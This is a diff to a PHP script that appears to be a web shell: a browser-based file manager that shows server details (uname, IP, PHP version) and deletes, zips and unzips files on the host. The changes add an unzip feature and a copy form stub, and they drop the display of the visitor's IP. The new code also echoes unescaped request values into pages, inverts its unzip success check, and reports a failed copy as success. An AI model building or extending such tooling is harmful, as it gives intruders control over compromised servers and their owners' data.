@@ -747,6 +747,13 @@ if (@$_GET['action'] == 'img') {
 	<?php
 	exit();
 }
+function unzip($source, $destination) {
+	$zip = new ZipArchive();
+	if ($zip->open($source) === true) {
+		$zip->extractTo($destination);
+		$zip->close();
+	}
+}
 function zip($source, $destination) {
 	if (extension_loaded('zip')) {
 		if (file_exists($source)) {
@@ -1191,9 +1198,7 @@ if (isset($_GET['edit'])) {
 }
 function get_server_info(){
     $server_addr = isset($_SERVER['SERVER_ADDR'])? $_SERVER['SERVER_ADDR']:$_SERVER["HTTP_HOST"];
-    $server_info['ip_adrress'] = "<span class='strong'>Server IP : <span style='color:green;'>".$server_addr."</span> | 
-    							  Your IP : ".$_SERVER['REMOTE_ADDR']."</span>";
-    $server_info['time_at_server'] = "<span class='strong'>Time@Server : <span style='color:green;'>".@date("d M Y H:i:s",time())."</span></span>";
+    $server_info['ip_adrress'] = "<span class='strong'>Server IP : <span style='color:green;'>".$server_addr."</span>";
     $server_info['uname'] = "<span class='strong' style='color:green;'>".php_uname()."</span>";
     $server_software = (getenv('SERVER_SOFTWARE')!='')? getenv('SERVER_SOFTWARE')." <span class='strong'> | </span>":'';
     $server_info['software'] = "<span class='strong'>" .$server_software."  PHP ".phpversion()."</span>";  
@@ -1284,9 +1289,13 @@ function get_server_info(){
   				} ?>'><?=basename($files)?></a>
   				</td>
   				<td class="pol">
-  					<center><?= size($files); ?></center>
+  					<center><?= filetype($files); ?></center>
   				</td>
-  				<td></td>
+  				<td class="perms">
+  					<center>
+  						<span class="k"><?= size($files); ?></span>
+  					</center>
+  				</td>
   				<td class="perms" colspan="2">
   					<center>
   						<span class="k">
@@ -1302,13 +1311,28 @@ function get_server_info(){
 <tr>
 	<td class="not" colspan="3">
 		<select name="mode">
-			<option value="" selected>choose</option>
-			<option value="1">hapus</option>
+			<option value="" selected>action</option>
+			<option> </option>
+			<option value="1">delete</option>
 			<option value="2">zip</option>
+			<?php
+			foreach ($scandir as $file_zip) {
+				if (is_file($file_zip)) {
+					$ext = pathinfo($file_zip, PATHINFO_EXTENSION);
+					switch ($ext) {
+						case 'zip':
+							?> <option value="unzip">Unzip ( <?=$file_zip?> )</option> <?php
+							break;
+						
+					}
+				}
+			}
+			?>
+			<option value="copy">copy</option>
 		</select>
 	</td>
 	<td class="not">
-		<input class="sad" type="submit" name="submit">
+		<input class="sad" type="submit" name="submit" value="execute">
 	</td>
 </tr>
 </form>
@@ -1320,9 +1344,9 @@ if (isset($_POST['submit'])) {
 			case '1':
 				if (is_dir($value)) {
 					if (delete($value)) {
-						alert("success", "Deleted <u>".basename($value)."</u> !");
+						print('<meta http-equiv="refresh" content="0;url=?path='.cwd().'&delete=success&filename='.basename($value).'">');
 					} else {
-						alert("failed", "Deleted <u>".basename($value)."</u> !");
+						print('<meta http-equiv="refresh" content="0;url=?path='.cwd().'&delete=failed&filename='.basename($value).'">');
 					}
 				} else {
 					if (delete($value)) {
@@ -1339,8 +1363,62 @@ if (isset($_POST['submit'])) {
 					alert("failed", "<u>".basename($value)."</u> to zip !");
 				}
 				break;
+			}
 		}
 	}
+switch ($_POST['mode']) {
+	case 'unzip':
+		foreach ($scandir as $file_zip) {
+			if (is_file($file_zip)) {
+				$ext = pathinfo($file_zip, PATHINFO_EXTENSION);
+				switch ($ext) {
+					case 'zip':
+					$file_unzip = $file_zip;
+					break;	
+				}
+				if (unzip($file_unzip, cwd())) {
+					print('<meta http-equiv="refresh" content="0;url=?path='.cwd().'&unzip=failed&filename='.$file_unzip.'">');
+				} else {
+					print('<meta http-equiv="refresh" content="0;url=?path='.cwd().'&unzip=success&filename='.$file_unzip.'">');
+				}
+			}
+		}
+	break;
+	case 'copy':
+		?>
+		<form method="post">
+			<tr>
+				<td colspan="2">
+					<input class="action" type="text" name="" value="file">
+				</td>
+				<td>to</td>
+				<td>
+					<input class="action" type="text" name="" value="dir">
+				</td>
+				<td>
+					<input type="submit" name="" value="copy">
+				</td>
+			</tr>
+		</form>
+		<?php
+		break;
+}
+if ($_GET['unzip'] == 'success') {
+	alert("success", "<u>".$_GET['filename']."</u> Unzip to <u>".cwd()."</u>");
+} elseif ($_GET['unzip'] == 'failed') {
+	alert("failed", "<u>".$_GET['filename']."</u> Unzip to <u>".cwd()."</u>");
+}
+
+if ($_GET['delete'] == 'success') {
+	alert("success", "Deleted <u>".$_GET['filename']."</u>");
+} elseif ($_GET['delete'] == 'failed') {
+	alert("failed", "Deleted <u>".$_GET['filename']."</u>");
+}
+
+if ($_GET['copy'] == 'success') {
+	alert("success", "copied <u>".$_GET['filename']." to ".$_GET['to']."</u>");
+} elseif ($_GET['copy'] == 'failed') {
+	alert("success", "copied <u>".$_GET['filename']." to ".$_GET['to']."</u>");
 }
 ?>
 <script type="text/javascript">
